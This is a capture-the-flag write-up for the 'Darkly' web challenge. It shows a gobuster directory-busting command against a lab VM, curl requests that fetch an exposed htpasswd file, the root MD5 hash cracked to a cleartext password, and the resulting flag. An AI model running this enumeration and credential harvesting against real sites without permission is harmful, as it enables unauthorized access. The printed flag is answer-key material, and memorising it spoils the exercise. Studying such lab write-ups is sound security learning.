Directory Fuzzing
=================

https://owasp.org/www-community/attacks/Brute_force_attack

Like always, after messing around for a while with the landing page, it's time for some good old fashioned directory busting.


```
hakim@mentos42:~/42/Darkly$ gobuster dir --exclude-length 975 --url http://192.168.56.104 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] Exclude Length:          975
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 193] [--> http://192.168.56.104/images/]
/admin                (Status: 301) [Size: 193] [--> http://192.168.56.104/admin/]
/audio                (Status: 301) [Size: 193] [--> http://192.168.56.104/audio/]
/css                  (Status: 301) [Size: 193] [--> http://192.168.56.104/css/]
/includes             (Status: 301) [Size: 193] [--> http://192.168.56.104/includes/]
/js                   (Status: 301) [Size: 193] [--> http://192.168.56.104/js/]
/fonts                (Status: 301) [Size: 193] [--> http://192.168.56.104/fonts/]
/errors               (Status: 301) [Size: 193] [--> http://192.168.56.104/errors/]
/whatever             (Status: 301) [Size: 193] [--> http://192.168.56.104/whatever/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

Non-existing URIs, like `/nonexistent` return a 404 error page, however, with a 200 HTTP status code, which confuses gobuster. So we can't rely on non-200 status codes, and we have to base it on the response Content Length (the 404 not found page always has the same content length, 975 in this case).

There are a couple of juicy looking endpoints, like /admin, /whatever, /errors, /audio and such. let's focus on /whatever for now.

The `/whatever` URI shows a directory list with 1 file: `htpasswd`

```
hakim@mentos42:~$ curl -L http://192.168.56.104/whatever
<html>
<head><title>Index of /whatever/</title></head>
<body bgcolor="white">
<h1>Index of /whatever/</h1><hr><pre><a href="../">../</a>
<a href="htpasswd">htpasswd</a>                                           29-Jun-2021 18:09                  38
</pre><hr></body>
</html>

hakim@mentos42:~$ curl -L http://192.168.56.104/whatever/htpasswd
root:437394baff5aa33daa618be47b75cb49
```

This file contains a `user:password` pair, with the password being a simple MD5 hash. Usually, for simple hashes with no salts I use the [CrackStation](https://crackstation.net/) webpage to obtain the cleartext password.

It shows us that the cleartext password is: `qwerty123@`. I wonder where could I introduce this user's credentials.... 
Earlier we discovered the `/admin` page. The content of this page is a simple user/passwd form. We introduce the credentials and we obtain the flag.

`http://192.168.56.104/admin`
The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

